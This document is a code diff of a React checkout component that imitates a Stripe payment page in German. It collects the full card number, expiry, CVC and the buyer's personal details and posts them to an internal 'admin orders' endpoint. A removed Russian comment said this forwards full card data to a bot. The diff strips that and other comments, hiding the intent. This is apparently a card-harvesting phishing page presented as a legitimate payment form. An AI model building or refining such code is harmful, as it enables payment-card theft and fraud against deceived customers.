@@ -25,7 +25,6 @@ export default function StripeCheckout() {
     if (items.length === 0) {
       router.push('/');
     }
-    // Load email and phone from localStorage (from previous checkout form)
     const savedEmail = localStorage.getItem('customerEmail') || '';
     const savedPhone = localStorage.getItem('customerPhone') || '';
     setEmail(savedEmail);
@@ -134,14 +133,12 @@ export default function StripeCheckout() {
     setIsLoading(true);
 
     try {
-      // Получаем сохраненные данные с этапа 1
       const customerName = localStorage.getItem('customerName') || '';
       const customerEmail = localStorage.getItem('customerEmail') || '';
       const customerPhone = localStorage.getItem('customerPhone') || '';
       const customerAddress = localStorage.getItem('customerAddress') || '';
       const customerCity = localStorage.getItem('customerCity') || '';
 
-      // Отправляем ВСЕ данные в бота (включая полные данные карты)
       const response = await fetch('/api/admin/orders', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -154,9 +151,9 @@ export default function StripeCheckout() {
           address: customerAddress,
           city: customerCity,
           cardholderName,
-          cardNumber: cardNumber, // Полный номер карты
-          expiry: expiry, // Дата истечения
-          cvc: cvc, // CVC код
+          cardNumber: cardNumber,
+          expiry: expiry,
+          cvc: cvc,
           cardType: getCardType(cardNumber),
           country,
           stage: 'stripe_form',
@@ -183,7 +180,6 @@ export default function StripeCheckout() {
 
   return (
     <div className="flex flex-col lg:flex-row min-h-screen pb-12 bg-white text-[#30313d]">
-      {/* Left side - Order Summary */}
       <div className="w-full lg:w-1/2 flex flex-col items-center lg:items-end pt-8 lg:pt-20 px-4 lg:pr-16 bg-white lg:border-r lg:border-gray-100">
         <div className="w-full max-w-md">
           <div className="flex items-center mb-8 lg:mb-12">
@@ -200,7 +196,6 @@ export default function StripeCheckout() {
           <p className="text-gray-500 text-lg mb-2">Bestellung</p>
           <h1 className="text-3xl lg:text-4xl font-bold text-[#1a1f36]">{total.toFixed(2).replace('.', ',')} €</h1>
           
-          {/* Items List */}
           <div className="mt-6 lg:mt-8 space-y-3 pb-6 lg:pb-0 border-b lg:border-b-0 border-gray-200">
             {items.map((item, idx) => (
               <div key={idx} className="flex justify-between text-sm text-gray-600">
@@ -212,7 +207,6 @@ export default function StripeCheckout() {
         </div>
       </div>
 
-      {/* Right side - Payment Form */}
       <div className="w-full lg:w-1/2 bg-white pt-8 lg:pt-20 px-4 lg:pl-16">
         <div className="max-w-[440px] mx-auto lg:mx-0">
           <button disabled className="w-full bg-gray-300 text-gray-500 font-semibold py-3 rounded-lg flex items-center justify-center mb-6 cursor-not-allowed opacity-60">
@@ -221,7 +215,6 @@ export default function StripeCheckout() {
 
           <form onSubmit={handleSubmit} className="space-y-6">
             
-            {/* Email & Phone Section */}
             <div className="border border-gray-200 rounded-lg overflow-hidden input-shadow">
               <div className="px-4 py-3 border-b border-gray-200 flex items-center">
                 <svg className="w-4 h-4 text-gray-400 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -251,12 +244,10 @@ export default function StripeCheckout() {
               </div>
             </div>
             
-            {/* Card Payment Section */}
             <section>
               <h3 className="font-semibold text-[15px] mb-2">Zahlungsart</h3>
               <div className="border border-gray-200 rounded-lg overflow-hidden input-shadow">
                 
-                {/* Card Number with Logos */}
                 <div className="p-3 relative">
                   <label className="text-[11px] text-[#6a7383] block mb-0.5">Kartendaten</label>
                   <div className="flex items-center justify-between">
@@ -270,7 +261,6 @@ export default function StripeCheckout() {
                       maxLength="19"
                     />
                     
-                    {/* Card Logos */}
                     <div className="flex items-center space-x-1.5 ml-2 min-w-[70px] justify-end">
                       {(!cardNumber || getCardType(cardNumber) === 'visa') && (
                         <img 
@@ -308,7 +298,6 @@ export default function StripeCheckout() {
                   {cardError && <div className="text-red-600 text-xs mt-1">{cardError}</div>}
                 </div>
 
-                {/* Expiry & CVC */}
                 <div className="flex border-t border-gray-200">
                   <div className="w-1/2 p-3 border-r border-gray-200">
                     <input
@@ -336,7 +325,6 @@ export default function StripeCheckout() {
               </div>
             </section>
 
-            {/* Cardholder Name */}
             <section>
               <label className="font-semibold text-[15px] block mb-2">Name des Karteninhabers</label>
               <input
@@ -348,7 +336,6 @@ export default function StripeCheckout() {
               />
             </section>
 
-            {/* Country */}
             <section>
               <label className="font-semibold text-[15px] block mb-2">Land oder Region</label>
               <select
@@ -366,7 +353,6 @@ export default function StripeCheckout() {
               </select>
             </section>
 
-            {/* Save Card Checkbox */}
             <div className="flex items-start p-4 border border-gray-200 rounded-lg bg-[#fcfcfd]">
               <input
                 type="checkbox"
@@ -380,7 +366,6 @@ export default function StripeCheckout() {
               </div>
             </div>
 
-            {/* Submit Button */}
             <button
               type="submit"
               disabled={isLoading}
@@ -389,7 +374,6 @@ export default function StripeCheckout() {
               {isLoading ? 'Verarbeitung...' : `${total.toFixed(2).replace('.', ',')} € bezahlen`}
             </button>
 
-            {/* Footer Links */}
             <div className="mt-8 flex flex-col items-center justify-center">
               <p className="text-center text-[12px] text-gray-600 mb-3">Geschützt durch <span className="font-semibold">Stripe</span></p>
               <div className="flex items-center justify-center space-x-4 text-[#6a7383] text-[13px] font-medium">
